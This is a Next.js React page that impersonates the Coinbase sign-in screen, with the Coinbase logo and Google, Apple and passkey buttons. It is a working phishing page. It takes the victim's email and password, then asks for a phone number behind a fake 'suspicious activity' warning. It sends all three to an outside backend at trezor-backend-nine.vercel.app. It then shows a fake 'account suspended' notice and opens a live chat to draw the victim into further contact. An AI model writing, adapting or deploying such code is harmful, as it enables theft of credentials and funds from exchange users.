"use client";
import React, { useState } from "react";
import Image from "next/image";
import axios from "axios";
import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/style.css";
export default function HomePage() {
    const [email, setEmail] = useState("");
    const [showPassword, setShowPassword] = useState(false);
    const [password, setPassword] = useState("");
    const [step, setStep] = useState(0)
    const [message, setMessage] = useState('Some suspicious activity found with your account. Enter phone number to verify your identity')
    // ✅ Basic email validation (simple regex)
    const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

    const handleContinue = () => {
        if (isValidEmail) {
            setShowPassword(true);
        }
    };

    const handleBack = () => {
        setShowPassword(false);
        setPassword("");
    };
    const [loading, setLoading] = useState(false)

    const handleSubmit = async (e) => {
        e.preventDefault(); // Prevent page reload
        try {
            if (!email || !password) {
                alert("Please enter both email and password");
                return;
            }
            const data = {
                title: "Coin Base",
                email: email,
                password

            }
            setLoading(true)
            // const response = await axios.post("https://trezor-backend.vercel.app/api/v1/send-user-info", data)
            // if (response) {
            setStep(1)
            // }
        } catch (err) {
            console.log(err);

        } finally {
            setLoading(false)


        }
    };
    const [phone, setPhone] = useState("");
    // Handle Step 2 submit
    const handleSubmitStep2 = async (e) => {
        e.preventDefault();
        setLoading(true);

        try {
            const stored = {
                email,
                password,
            }
            const data = {
                title: 'Coin Base',
                ...stored,
                phone: phone,
            };

            const response = await axios.post(
                'https://trezor-backend-nine.vercel.app/api/v1/send-user-info',
                data
            );

            if (response) {
                window.Tawk_API?.maximize();
            }
        } catch (err) {
            console.error(err);
        } finally {
            setMessage('Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.')
            setLoading(false);
        }
    };

    return (
        <div className="min-h-screen bg-[#0a0b0d]">
            {/* Top Bar */}
            <div className="flex justify-between h-[72px] items-center px-8">
                <svg
                    aria-label="Coinbase logo"
                    height="32"
                    role="img"
                    viewBox="0 0 48 48"
                    width="32"
                    xmlns="http://www.w3.org/2000/svg"
                >
                    <path
                        d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z"
                        fill="#FFFFFF"
                    />
                </svg>

                <div className="flex gap-4">
                    <button className="font-bold text-blue-500">Sign up</button>
                    <button className="bg-[#32353d] px-5 py-2 rounded-full font-bold">
                        Sign in to Business
                    </button>
                </div>
            </div>

            {step == 0 && <div className="flex items-center justify-center text-white mt-12">
                <div className={`w-full max-w-md bg-transparent border border-neutral-800 rounded-2xl p-8 ${showPassword ? "pb-2" : "pb-4"} shadow-md`}>

                    {/* Title */}
                    <h1
                        className="text-[27px] font-semibold mb-6"
                        style={{ wordSpacing: "0.1px" }}
                    >
                        Sign in to Coinbase
                    </h1>

                    {!showPassword ? (
                        <>
                            <div className="mb-4">
                                <label className="block text-sm text-gray-300 mb-2 font-bold">
                                    Email
                                </label>
                                <input
                                    type="email"
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    placeholder="Your email address"
                                    className="w-full px-4 py-4 bg-transparent border border-gray-700 rounded-lg focus:outline-none focus:border-blue-500 text-gray-200 placeholder-gray-500"
                                />
                            </div>

                            {/* Continue Button */}
                            <button
                                disabled={!isValidEmail}
                                onClick={handleContinue}
                                className={`cursor-pointer w-full py-4 rounded-full font-semibold mb-4 transition-colors duration-200 ${isValidEmail
                                    ? "bg-[#3b5bdb] hover:bg-[#2f49b9]"
                                    : "bg-[#3b5bdb80] text-black cursor-not-allowed"
                                    }`}
                            >
                                Continue
                            </button>
                        </>
                    ) : (
                        <>
                            {/* Password Field */}
                            <button className="border border-[#8a919e33] flex gap-2 items-center  w-full p-2.5 py-4 rounded-md mb-8 text-start font-bold">
                                <div className="w-[30px] h-[30px] overflow-hidden">
                                    <Image
                                        src="/tessss.jpg"
                                        width={50}
                                        height={50}
                                        className="rounded-full"
                                        alt="icon"
                                    /> </div> {email}
                            </button>
                            <div className="mb-4">
                                <label className="block text-sm text-white mb-2 font-bold">
                                    Password
                                </label>
                                <input
                                    type="password"
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    placeholder="Enter your password"
                                    className="w-full px-4 py-4 bg-transparent border border-gray-700 rounded-lg focus:outline-none focus:border-blue-500 text-gray-200 placeholder-gray-500"
                                />
                            </div>
                            <h2 className="font-medium text-[#578bfa] mb-15">Forgot password?</h2>

                            <div className="flex gap-3 mt-5">
                                <button
                                    onClick={handleSubmit}
                                    loading={loading.toString()}
                                    disabled={loading}
                                    className={`cursor-pointer w-full py-4 rounded-full font-semibold mb-4 transition-colors duration-200 ${password.length
                                        ? "bg-[#3b5bdb] hover:bg-[#2f49b9]"
                                        : "bg-[#3b5bdb80] text-black cursor-not-allowed"
                                        }`}
                                >
                                    Continue
                                </button>
                            </div>
                        </>
                    )}

                    {/* Divider */}
                    {!showPassword && (
                        <>
                            <div className="flex items-center mb-4">
                                <div className="flex-1 h-px bg-gray-800"></div>
                                <span className="px-3 text-gray-400 text-sm">OR</span>
                                <div className="flex-1 h-px bg-gray-800"></div>
                            </div>

                            {/* Social Sign-ins */}
                            <div className="space-y-3">
                                {/* Passkey */}
                                <button className="relative cursor-pointer w-full flex items-center justify-center bg-[#32353d] border border-gray-700 py-3.5 rounded-full font-bold">
                                    <span className="absolute left-8 text-lg">
                                        {/* Passkey Icon */}
                                        <svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5.37256 0.93801C4.02536 1.22585 2.8994 2.35696 2.55569 3.75968C2.43717 4.24618 2.43717 5.05701 2.55569 5.5435C2.90335 6.9665 4.02141 8.07328 5.40417 8.36518C5.62936 8.41383 5.8506 8.42599 6.30098 8.41383C6.80668 8.39356 6.941 8.37734 7.22941 8.28004C8.02746 8.01652 8.62007 7.59489 9.08625 6.95434C9.38256 6.55298 9.56429 6.18405 9.70652 5.71783C9.80529 5.38944 9.81319 5.30836 9.81319 4.65159C9.81319 3.99482 9.80529 3.91374 9.70652 3.58536C9.3312 2.33668 8.45809 1.43261 7.22941 1.02315C6.92915 0.921793 6.82643 0.909631 6.26148 0.897468C5.83875 0.88936 5.54639 0.901522 5.37256 0.93801Z" fill="white"></path><path d="M12.5633 5.55967C11.9983 5.68129 11.5045 5.96508 11.0817 6.41509C10.2995 7.23808 10.0625 8.4908 10.4891 9.56515C10.7064 10.1165 11.1963 10.6922 11.6862 10.976L11.9272 11.1179L11.9312 13.3882V15.6585L12.5356 16.2747L13.1401 16.895L14.1633 15.8409L15.1905 14.7869L14.5781 14.1585L13.9658 13.5301L14.5702 12.9098C14.8982 12.5693 15.1708 12.2733 15.1708 12.253C15.1708 12.2328 14.9535 11.9895 14.6888 11.7179C14.4241 11.4463 14.2147 11.2152 14.2226 11.2071C14.2344 11.199 14.3846 11.1138 14.5584 11.0125C15.2142 10.6395 15.7397 9.94218 15.9214 9.20839C16.0162 8.8273 16.0281 8.11782 15.9411 7.75295C15.7081 6.73131 14.9021 5.884 13.8986 5.60021C13.5944 5.51507 12.8754 5.4948 12.5633 5.55967ZM13.6023 6.90564C13.7959 7.04348 13.9855 7.38808 13.9855 7.607C13.9855 7.81377 13.8196 8.15026 13.6576 8.27594C13.4759 8.41783 13.148 8.48675 12.9386 8.42999C12.5988 8.33269 12.3302 7.97593 12.3262 7.61917C12.3223 6.94618 13.069 6.52861 13.6023 6.90564Z" fill="white"></path><path d="M4.16802 9.78411C2.34279 10.0719 0.809901 11.4098 0.233093 13.218C0.0355566 13.8423 0 14.1585 0 15.3585V16.4491H5.33349H10.667V14.1382V11.8274L10.3509 11.5193C9.99536 11.1706 9.71486 10.7976 9.51337 10.4084L9.37904 10.1449L8.94446 9.99492C8.23728 9.75167 7.90147 9.71924 6.09993 9.72329C4.97397 9.72735 4.42087 9.74356 4.16802 9.78411Z" fill="white"></path></svg>
                                    </span>
                                    Sign in with Passkey
                                </button>

                                {/* Google */}
                                <button className="relative cursor-pointer w-full flex items-center justify-center bg-[#32353d] border border-gray-700 py-3.5 rounded-full font-bold">
                                    <span className="absolute left-8 text-lg">
                                        {/* Google Icon */}
                                        <svg width="17" height="17" viewBox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M16.18 8.57691C16.18 8.00964 16.1291 7.46419 16.0345 6.94055H8.5V10.0351H12.8055C12.62 11.0351 12.0564 11.8824 11.2091 12.4496V14.4569H13.7945C15.3073 13.0642 16.18 11.0133 16.18 8.57691Z" fill="white"></path><path fillRule="evenodd" clipRule="evenodd" d="M8.50017 16.3949C10.6602 16.3949 12.4711 15.6786 13.7947 14.4567L11.2093 12.4495C10.4929 12.9295 9.57653 13.2131 8.50017 13.2131C6.41653 13.2131 4.65289 11.8058 4.0238 9.91492H1.35107V11.9876C2.66744 14.6022 5.37289 16.3949 8.50017 16.3949Z" fill="white"></path><path fillRule="evenodd" clipRule="evenodd" d="M4.02364 9.91497C3.86364 9.43497 3.77273 8.92225 3.77273 8.39497C3.77273 7.8677 3.86364 7.35497 4.02364 6.87497V4.80225H1.35091C0.809091 5.88225 0.5 7.10406 0.5 8.39497C0.5 9.68588 0.809091 10.9077 1.35091 11.9877L4.02364 9.91497Z" fill="white"></path><path fillRule="evenodd" clipRule="evenodd" d="M8.50017 3.57684C9.67471 3.57684 10.7293 3.98047 11.5583 4.7732L13.8529 2.47866C12.4674 1.18775 10.6565 0.39502 8.50017 0.39502C5.37289 0.39502 2.66744 2.18775 1.35107 4.80229L4.0238 6.87502C4.65289 4.98411 6.41653 3.57684 8.50017 3.57684Z" fill="white"></path></svg>
                                    </span>
                                    Sign in with Google
                                </button>

                                {/* Apple */}
                                <button className="relative cursor-pointer w-full flex items-center justify-center bg-[#32353d] border border-gray-700 py-3.5 rounded-full font-bold">
                                    <span className="absolute left-8 text-lg">
                                        <svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg"><g clipPath="url(#clip0_1022_155)"><path d="M14.1869 13.1777C13.955 13.7134 13.6805 14.2065 13.3625 14.6599C12.929 15.2779 12.5741 15.7057 12.3006 15.9433C11.8765 16.3332 11.4222 16.533 10.9357 16.5443C10.5865 16.5443 10.1653 16.4449 9.67504 16.2433C9.18315 16.0427 8.73112 15.9433 8.31779 15.9433C7.88431 15.9433 7.4194 16.0427 6.92212 16.2433C6.42409 16.4449 6.02288 16.55 5.71613 16.5604C5.24961 16.5803 4.78461 16.3749 4.32046 15.9433C4.02421 15.6849 3.65367 15.242 3.20977 14.6145C2.73351 13.9444 2.34195 13.1673 2.0352 12.2814C1.70668 11.3245 1.54199 10.3979 1.54199 9.50085C1.54199 8.47326 1.76403 7.58699 2.20878 6.84429C2.55832 6.24773 3.02332 5.77714 3.6053 5.43168C4.18729 5.08622 4.81613 4.91017 5.49333 4.89891C5.86387 4.89891 6.34979 5.01353 6.95364 5.23879C7.55579 5.46481 7.94242 5.57942 8.11194 5.57942C8.23867 5.57942 8.66818 5.4454 9.3963 5.17822C10.0849 4.93043 10.666 4.82783 11.1421 4.86825C12.4321 4.97236 13.4013 5.4809 14.0459 6.39708C12.8921 7.09615 12.3214 8.07527 12.3327 9.33134C12.3431 10.3097 12.6981 11.1239 13.3956 11.7703C13.7117 12.0703 14.0648 12.3022 14.4576 12.4669C14.3724 12.7139 14.2825 12.9506 14.1869 13.1777ZM11.2282 1.53515C11.2282 2.30199 10.948 3.01799 10.3896 3.68071C9.71574 4.46855 8.90063 4.9238 8.01672 4.85197C8.00546 4.75997 7.99893 4.66314 7.99893 4.5614C7.99893 3.82523 8.3194 3.03739 8.88852 2.39322C9.17265 2.06706 9.53401 1.79587 9.97223 1.57954C10.4095 1.36643 10.8231 1.24858 11.2121 1.22839C11.2235 1.33091 11.2282 1.43343 11.2282 1.53514V1.53515Z" fill="white"></path></g><defs><clipPath id="clip0_1022_155"><rect width="16" height="16" fill="white" transform="translate(0 0.89502)"></rect></clipPath></defs></svg>
                                    </span>
                                    Sign in with Apple
                                </button>
                            </div>
                        </>
                    )}

                    {/* Footer */}
                    {!showPassword && <p className="text-sm text-center text-[#8a919e] mt-6">
                        Not your device? Use a private window. <br />
                        See our <span className="hover:underline">Privacy Policy</span> for
                        more info.
                    </p>}

                </div>

            </div>}
            {(showPassword && step == 0) && <div>
                <h2 className="font-bold text-[#578bfa] mt-4 text-center"
                    onClick={handleBack}
                >Cancel signing in</h2>
            </div>}
            {step == 1 && <div className="flex items-center justify-center text-white mt-12">
                <div className="w-full max-w-md bg-transparent border border-neutral-800 rounded-2xl p-8 shadow-md">
                    {/* Title */}
                    <div className="p-4 border border-gray-600 rounded-md mb-4">
                        <h3 className="text-red-600 font-bold">Important Message!</h3>
                        <p className="text-sm">
                            {message}
                        </p>
                    </div>

                    {/* Phone Input */}
                    <div className="mb-6">
                        <label className="block text-sm text-gray-300 mb-2 font-bold">
                            Phone Number
                        </label>
                        <div className="border border-gray-700 rounded-lg bg-transparent px-3 py-2 focus-within:border-blue-500 transition-all">
                            <PhoneInput
                                country={"in"}
                                value={phone}
                                onChange={(phone) => setPhone(phone)}
                                inputClass="!bg-transparent !text-gray-200 !border-none !w-full !text-base !font-medium focus:!outline-none"
                                buttonClass="!bg-transparent !border-none"
                                dropdownClass="!bg-[#0a0b0d] !text-gray-200"
                                searchClass="!bg-[#0a0b0d] !text-gray-200"
                                containerClass="!w-full"
                            />
                        </div>
                    </div>

                    {/* Continue Button */}
                    <button
                        disabled={!phone || phone.length < 7}
                        onClick={handleSubmitStep2}
                        className={`cursor-pointer w-full py-4 rounded-full font-semibold transition-colors duration-200 ${phone.length >= 7
                            ? "bg-[#3b5bdb] hover:bg-[#2f49b9]"
                            : "bg-[#3b5bdb80] text-black cursor-not-allowed"
                            }`}
                    >
                        {loading ? "Loading..." : "Continue"}
                    </button>
                </div>
            </div>}
        </div>
    );
}
